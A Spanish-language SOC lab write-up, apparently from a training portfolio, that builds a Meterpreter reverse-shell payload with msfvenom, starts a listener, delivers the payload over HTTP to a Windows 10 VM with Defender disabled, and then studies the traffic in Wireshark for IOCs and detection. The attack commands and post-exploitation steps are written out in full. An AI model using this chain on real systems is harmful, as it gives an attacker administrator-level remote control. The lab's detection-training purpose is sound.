# 🔬 Laboratorio 06 — Reverse Shell Detection

![Metasploit](https://img.shields.io/badge/Tool-Metasploit_6.4.92-ED1C24?style=for-the-badge&logo=metasploit)
![Wireshark](https://img.shields.io/badge/Tool-Wireshark-1679A7?style=for-the-badge&logo=wireshark)
![Kali](https://img.shields.io/badge/Attacker-Kali_Linux-557C94?style=for-the-badge&logo=kalilinux)
![Windows](https://img.shields.io/badge/Victim-Windows_10-0078D6?style=for-the-badge&logo=windows)

---

## 🎬 Escenario

Son las 2:17 AM. El equipo de SOC recibe una alerta del SIEM: un host Windows interno
está enviando tráfico constante hacia una IP interna en el puerto 4444 — un puerto
que no debería tener actividad a esa hora.

Al revisar el proceso en el host afectado, encuentran un archivo llamado `payload.exe`
corriendo desde la carpeta `Downloads` del Administrator, con una conexión TCP
activa y establecida hacia una IP de Kali Linux dentro de la red.

Este laboratorio reproduce ese escenario completo — desde la creación del payload
malicioso, la apertura de la sesión Meterpreter, hasta la detección del tráfico
anómalo con Wireshark. Ver ambos lados del ataque es lo que convierte a un técnico
en un analista SOC.

---

## 🎯 Objetivo

Generar una reverse shell desde Kali Linux hacia Windows 10 usando Metasploit/msfvenom,
capturar y analizar el tráfico de la conexión con Wireshark, y documentar los
indicadores de compromiso (IOCs) que permitirían detectar este ataque en un entorno real.

---

## 🖥️ Entorno

| Rol | Sistema | IP | Herramientas |
|-----|---------|-----|--------------|
| Atacante | Kali Linux | 10.14.99.129 | Metasploit 6.4.92, msfvenom, Wireshark |
| Víctima | Windows 10 22H2 (Build 19045) | 10.14.99.128 | — |
| Virtualización | VirtualBox | — | Red NAT compartida |

---

## 🛠️ Herramientas utilizadas

- **Metasploit Framework 6.4.92** — Framework de explotación y post-explotación
- **msfvenom** — Generador de payloads maliciosos
- **Meterpreter** — Shell avanzada de post-explotación
- **Wireshark 4.x** — Captura y análisis de tráfico de red
- **Python3 http.server** — Servidor HTTP para transferencia del payload

---

## 📋 Procedimiento

### Paso 1 — Verificación de conectividad

**Desde Kali → Windows:**
```bash
ping 10.14.99.128
# Resultado: 6/6 paquetes, 0% packet loss, RTT avg: 2.060 ms
```

**Desde Windows → Kali:**
```cmd
ping 10.14.99.129
# Resultado: 4/4 recibidos, 0% loss, avg 1ms
```
Conectividad bidireccional confirmada ✅

---

### Paso 2 — Preparar Wireshark

Se abrió Wireshark en Kali seleccionando la interfaz `eth0` **antes** de cualquier
acción ofensiva, para capturar el tráfico completo desde el inicio, incluyendo
la transferencia del payload y el establecimiento de la sesión.

---

### Paso 3 — Crear el payload con msfvenom

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.14.99.129 \
  LPORT=4444 \
  -f exe \
  -o /tmp/payload.exe
```

**Resultado:**
```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7680 bytes
Saved as: /tmp/payload.exe
```

| Parámetro | Valor | Descripción |
|-----------|-------|-------------|
| `-p` | `windows/x64/meterpreter/reverse_tcp` | Payload tipo reverse shell para Windows x64 |
| `LHOST` | `10.14.99.129` | IP del atacante (Kali) — hacia donde se conecta la víctima |
| `LPORT` | `4444` | Puerto de escucha en Kali |
| `-f exe` | `.exe` | Formato ejecutable para Windows |
| Tamaño | 7,680 bytes | Archivo pequeño — fácil de pasar desapercibido |

---

### Paso 4 — Configurar el listener en Metasploit

```bash
msfconsole
```

```bash
msf > use exploit/multi/handler
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 10.14.99.129
msf exploit(multi/handler) > set LPORT 4444
msf exploit(multi/handler) > run
```

**Resultado:**
```
[*] Started reverse TCP handler on 10.14.99.129:4444
```
Kali en espera de conexión entrante ✅

---

### Paso 5 — Transferir el payload a Windows

En una segunda terminal de Kali:
```bash
cd /tmp
python3 -m http.server 8080
```

Desde Windows, se navegó a `http://10.14.99.129:8080` y se descargó `payload.exe`.
Windows Defender fue deshabilitado temporalmente para el laboratorio.

---

### Paso 6 — Ejecutar el payload y abrir la sesión

Al ejecutar `payload.exe` en Windows, en Kali apareció inmediatamente:

```
[*] Sending stage (230982 bytes) to 10.14.99.128
[*] Meterpreter session 1 opened (10.14.99.129:4444 → 10.14.99.128:49784)
    at 2026-04-29 02:17:43 -0400
```

**Sesión Meterpreter activa** — Kali tiene control total sobre Windows ✅

---

## 🧪 Ejercicios de Post-Explotación

---

### Ejercicio 1 — Reconocimiento del sistema comprometido

```bash
meterpreter > sysinfo
```
```
Computer        : DESKTOP-SVEV486
OS              : Windows 10 22H2+ (10.0 Build 19045)
Architecture    : x64
System Language : en_US
Domain          : JHON1499
Logged On Users : 6
Meterpreter     : x64/windows
```

```bash
meterpreter > getuid
```
```
Server username: JHON1499\Administrator
```

> 🔴 **Crítico:** La sesión corre como `Administrator` — acceso privilegiado total al sistema.

---

### Ejercicio 2 — Enumeración de red desde la víctima

```bash
meterpreter > ipconfig
```
```
Interface 7 — Intel(R) PRO/1000 MT Network Connection
  Hardware MAC : 00:0c:29:b3:6c:13
  IPv4 Address : 10.14.99.128
  IPv4 Netmask : 255.255.255.0
```

---

### Ejercicio 3 — Lista de procesos (detección del payload)

```bash
meterpreter > ps
```

Entre los ~100 procesos listados, el proceso malicioso es claramente visible:

```
PID    PPID   Name          Arch  User                    Path
3012   1920   payload.exe   x64   JHON1499\Administrator  C:\Users\Administrator\Downloads\payload.exe
```

> ⚠️ **IOC Crítico:** `payload.exe` corriendo desde `Downloads` — ubicación inusual para un ejecutable legítimo.

También se detectó en el proceso list:
```
3440   700    wazuh-agent.exe   x86   NT AUTHORITY\SYSTEM
```
> 📌 **Nota:** Wazuh está instalado en la víctima — este ataque quedó registrado en el SIEM simultáneamente.

---

### Ejercicio 4 — Verificar la conexión activa desde Windows

```bash
meterpreter > shell
```
```
Process 4512 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19045.6466]

C:\Users\Administrator\Downloads> whoami
jhon1499\administrator

C:\Users\Administrator\Downloads> hostname
DESKTOP-SVEV486

C:\Users\Administrator\Downloads> netstat -an | findstr 4444
  TCP    10.14.99.128:50014    10.14.99.129:4444    ESTABLISHED
```

> ✅ **Evidencia directa:** La conexión TCP hacia el puerto 4444 del atacante está `ESTABLISHED` — confirmación desde la perspectiva de la víctima.

---

## 🔍 Análisis con Wireshark

### Filtro 1 — Tráfico de la reverse shell

```
tcp.port == 4444
```

**Resultado:** Flujo TCP continuo entre `10.14.99.128:49784` y `10.14.99.129:4444`.
Se observa el handshake inicial (SYN, SYN-ACK, ACK) seguido de transferencia
continua de datos en ambas direcciones — patrón típico de sesión interactiva.

### Filtro 2 — Tráfico bidireccional completo

```
ip.src == 10.14.99.128 && ip.dst == 10.14.99.129
```

**Resultado:** Se observa tanto el tráfico HTTP de descarga del payload (puerto 8080)
como el tráfico de la sesión Meterpreter (puerto 4444) — toda la cadena del ataque
visible en una sola captura.

### Filtro 3 — Stream completo de la sesión

```
tcp.stream
```

**Resultado:** Stream TCP completo con 7,300 bytes de payload data transferida.
En el panel hexadecimal se observan patrones de bytes del stage de Meterpreter
(`KERNEL32.dll`, strings del loader de Windows) — firma del payload en el tráfico.

### Tabla de filtros Wireshark

| Filtro | Resultado | Significado |
|--------|-----------|-------------|
| `tcp.port == 4444` | Flujo TCP activo | Sesión reverse shell activa |
| `ip.src == 10.14.99.128 && ip.dst == 10.14.99.129` | Tráfico saliente víctima | Conexión iniciada desde el host comprometido |
| `tcp.stream` | 7,300 bytes transferidos | Stage de Meterpreter + comandos |
| `http && tcp.port == 8080` | GET /payload.exe | Momento de descarga del malware |

---

## 📸 Capturas de Pantalla

### 1️⃣ IPs — Kali Linux (ip a)
<img width="624" height="175" alt="Kali Linux (ip a)" src="https://github.com/user-attachments/assets/0597e6b9-b6d8-45e4-ae94-b765255f45f4" />

### 2️⃣ IPs — Windows 10 (ipconfig)
<img width="616" height="258" alt="IPs — Windows 10 (ipconfig)" src="https://github.com/user-attachments/assets/3298177c-b3a9-446b-bef7-9f8cca9d4a1b" />

### 3️⃣ Versión de Metasploit
<img width="295" height="86" alt="Versión de Metasploit" src="https://github.com/user-attachments/assets/dcdc2d38-3985-40bc-a7d9-1fd374628a88" />

### 4️⃣ Ping bidireccional — Conectividad confirmada
<img width="538" height="233" alt="Ping bidireccional — Conectividad confirmada" src="https://github.com/user-attachments/assets/4911e2ff-43ac-4de4-9d9a-aeef86e0cbc3" />

<img width="539" height="260" alt="Ping bidireccional — Conectividad" src="https://github.com/user-attachments/assets/c418c2a6-58ec-40bb-b0ca-9b3d7bcceb49" />

### 5️⃣ Wireshark — Captura iniciada antes del ataque
<img width="624" height="244" alt="Captura iniciada antes del ataque" src="https://github.com/user-attachments/assets/8e6f77b8-6e5a-4d38-86c2-4fbc6836c99f" />

### 6️⃣ msfvenom — Creación del payload
<img width="624" height="107" alt="Creación del payload" src="https://github.com/user-attachments/assets/80ca5f93-58b3-4295-937a-3d257400dfa3" />

### 7️⃣ Metasploit — Configuración del listener (pasos 1-5)
<img width="624" height="695" alt="Configuración del listener" src="https://github.com/user-attachments/assets/de7c1e62-c49f-41fc-b081-e2b141691bab" />

<img width="511" height="38" alt="Configuración del listener 1" src="https://github.com/user-attachments/assets/e65f65a8-2c62-4eab-95d5-5dccb600eb3d" />

<img width="624" height="33" alt="Configuración del listener 2" src="https://github.com/user-attachments/assets/897ce66d-b05e-458c-ba6f-2c9b9d646680" />

<img width="478" height="34" alt="Configuración del listener 3" src="https://github.com/user-attachments/assets/d1985b49-e4b4-42ad-a356-fb6c6422fdcd" />

<img width="442" height="38" alt="Configuración del listener 4" src="https://github.com/user-attachments/assets/54486317-6e2b-4821-9f4c-a93cb4fd27f3" />

<img width="624" height="30" alt="Configuración del listener 5" src="https://github.com/user-attachments/assets/7b0264a2-789e-4a8c-8e6e-2ee4c96c1e64" />

### 8️⃣ Transferencia del payload via HTTP (Python server + descarga en Windows)
<img width="446" height="98" alt="Transferencia del payload via HTTP (Python server + descarga en Windows)" src="https://github.com/user-attachments/assets/558e514b-dc89-4732-ab77-2146b24de010" />

<img width="624" height="489" alt="Transferencia del payload via HTTP  Windows" src="https://github.com/user-attachments/assets/c94723c7-e81a-4d66-a5b6-06f952d70d8f" />

<img width="405" height="126" alt="Transferencia del payload via HTTP  descarga en Windows" src="https://github.com/user-attachments/assets/6099b4a8-019b-4a46-90d1-1ee4f9d01d19" />

### 9️⃣ Metasploit — Meterpreter session 1 opened
<img width="624" height="30" alt="Meterpreter session 1 opened" src="https://github.com/user-attachments/assets/1c067c26-7c33-47a4-83fe-459c8187351f" />

### 🔟 Meterpreter — sysinfo + getuid
<img width="482" height="139" alt="sysinfo" src="https://github.com/user-attachments/assets/d53f5e3d-33f5-46df-b470-1ad220a1269a" />

<img width="426" height="36" alt="getuid" src="https://github.com/user-attachments/assets/8f977b90-0777-4584-ab22-a404a7079a7a" />

### 1️⃣1️⃣ Meterpreter — ps (payload.exe en PID 3012)
<img width="624" height="322" alt="ps (payload exe en PID 3012)" src="https://github.com/user-attachments/assets/018d0970-75b1-4bf3-a8e2-c145cc79f8b7" />

### 1️⃣2️⃣ Shell Windows — whoami + hostname + netstat (conexión ESTABLISHED)
<img width="611" height="328" alt="whoami + hostname + netstat (conexión ESTABLISHED)" src="https://github.com/user-attachments/assets/ae5a71c5-b85a-4c9d-8fb9-f5cb33ac8b03" />

### 1️⃣3️⃣ Wireshark — Filtro tcp.port == 4444
<img width="624" height="307" alt="Filtro tcp port == 4444" src="https://github.com/user-attachments/assets/beec3a1d-b2ea-4090-86b0-0960682f019a" />

### 1️⃣4️⃣ Wireshark — Filtro ip.src + ip.dst
<img width="624" height="280" alt="Filtro ip src + ip dst" src="https://github.com/user-attachments/assets/16c4e70f-efcf-4895-9bac-6b404ae83319" />

### 1️⃣5️⃣ Wireshark — tcp.stream (payload en hex)
<img width="624" height="284" alt="tcp stream" src="https://github.com/user-attachments/assets/f4a73e4a-785c-4e67-b354-f794f83a6324" />

---

## ⚠️ Errores encontrados y soluciones

### Windows Defender bloqueó el payload

**Causa:** Windows Defender detecta `payload.exe` como malware y lo elimina
automáticamente antes de ejecutarse.

**Solución:** Desactivar temporalmente la protección en tiempo real desde
Windows Security → Virus & threat protection → Manage settings → Real-time protection OFF.

> En un entorno real, los atacantes usan encoders o técnicas de evasión para
> evitar la detección del antivirus. Para este laboratorio educativo, la
> desactivación manual es suficiente.

---

## 🔍 Findings (Hallazgos)

- Sesión Meterpreter abierta como `JHON1499\Administrator` — nivel de privilegio máximo
- `payload.exe` ejecutándose desde `C:\Users\Administrator\Downloads\` — ruta inusual para ejecutables legítimos
- Conexión TCP `ESTABLISHED` en puerto 4444 desde Windows hacia Kali — puerto no estándar sin justificación legítima
- Stage de Meterpreter transferido: 230,982 bytes en el establecimiento de la sesión
- Tráfico interactivo continuo en el stream — patrón de sesión de control remoto activa
- Wazuh agent instalado en el host comprometido registró el evento simultáneamente en el SIEM
- El payload de solo 7,680 bytes pasó desapercibido para Windows Defender con protección activa hasta la ejecución

---

## ⚠️ Impacto

- Acceso completo al sistema con permisos de Administrator — posibilidad de crear usuarios, modificar registros, exfiltrar datos
- El atacante puede moverse lateralmente a otros hosts usando credenciales del Administrator comprometido
- Puerto 4444 abierto como canal persistente de command & control (C2)
- Wazuh corriendo en la víctima fue visible desde Meterpreter — un atacante real podría intentar desactivarlo
- El tamaño pequeño del payload (7,680 bytes) lo hace difícil de detectar sin análisis de comportamiento

---

## 🚨 Detección (SOC)

- **Alerta de red:** Conexión TCP saliente desde un host interno al puerto 4444 — puerto no asociado a ningún servicio legítimo
- **Alerta de proceso:** `payload.exe` ejecutándose desde `C:\Users\...\Downloads\` — ejecutables legítimos no residen en Downloads
- **Alerta SIEM (Wazuh):** Proceso nuevo con conexión de red saliente creado por usuario Administrator
- **Alerta de comportamiento:** Un proceso hijo de `chrome.exe` (PID 1920 → 3012) generando tráfico de red — comportamiento anómalo
- **Alerta de volumen:** 230,982 bytes transferidos en el handshake inicial — transferencia de stage detectable por volumen inusual

---

## 🛡️ Mitigación

- Implementar reglas de firewall que bloqueen conexiones salientes en puertos no estándar (como 4444)
- Configurar políticas de AppLocker o Windows Defender Application Control para bloquear ejecución de `.exe` desde carpetas de usuario (`Downloads`, `Temp`, `AppData`)
- Habilitar y mantener activo Windows Defender con protección en tiempo real — nunca desactivarlo en producción
- Monitorear procesos hijos inusuales de aplicaciones de usuario (browsers, Office) que generen tráfico de red
- Configurar alertas en SIEM para conexiones salientes hacia IPs internas en puertos no estándar
- Implementar segmentación de red con VLANs para limitar el alcance del movimiento lateral post-compromiso

---

## 💼 ¿Por qué importa esto en el mundo real?

Este laboratorio replica la **fase de Command & Control (C2) del Cyber Kill Chain** —
el momento en que el atacante obtiene acceso interactivo al sistema comprometido.

Lo que hace a este ataque especialmente relevante no es su sofisticación técnica,
sino su simplicidad: un archivo `.exe` de 7,680 bytes, descargado a través de HTTP,
ejecutado manualmente. Sin ingeniería social, sin vulnerabilidades de día cero.
Y funcionó.

En un entorno corporativo real, el vector de entrega más común de este tipo de
payload no es un servidor HTTP interno — es un email de phishing con el archivo
adjunto, o un enlace a una página que lo descarga automáticamente. El resultado
final es el mismo: sesión Meterpreter, acceso de Administrator.

Lo que aprendí que llevaría a un trabajo real: la detección efectiva de reverse
shells no depende de identificar el archivo malicioso antes de la ejecución —
depende de detectar el comportamiento anómalo después. Una conexión saliente al
puerto 4444, un proceso corriendo desde Downloads, un ejecutable sin firma digital
verificada. Esos son los IOCs que salvan redes, no el nombre del archivo.

En la DGA, durante mi experiencia con sistemas de seguridad electrónica, vi
exactamente este tipo de riesgo en dispositivos IoT con firmware sin firmar que
establecían conexiones salientes a IPs externas. El principio es el mismo:
si no sabes qué tráfico es normal, no puedes detectar lo anómalo.

---

## ✅ Conclusiones

1. `msfvenom` genera payloads funcionales en segundos — la barrera de entrada para este tipo de ataque es mínima
2. Meterpreter proporciona acceso interactivo completo: sistema, procesos, red y shell — todo desde una sola sesión
3. El puerto 4444 es un IOC clásico — cualquier tráfico saliente a ese puerto debe investigarse inmediatamente
4. Wireshark permite ver el handshake completo, la transferencia del stage y el tráfico interactivo de la sesión
5. La presencia de `wazuh-agent.exe` en el proceso list confirma que el SIEM registró este ataque en tiempo real
6. La ubicación del ejecutable (`Downloads`) y su tamaño (7,680 bytes) son suficientes para levantar una alerta en un SOC bien configurado

---

## 🔗 Referencias

- [Metasploit Documentation — msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)
- [MITRE ATT&CK — T1059 Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
- [MITRE ATT&CK — T1071 Application Layer Protocol](https://attack.mitre.org/techniques/T1071/)
- [MITRE ATT&CK — T1105 Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)
- [MITRE ATT&CK — T1572 Protocol Tunneling](https://attack.mitre.org/techniques/T1572/)
- [Cyber Kill Chain — Lockheed Martin](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html)
- [Wireshark Display Filters Reference](https://www.wireshark.org/docs/dfref/)

---

*← [Volver al Portafolio Principal](../README.md)*
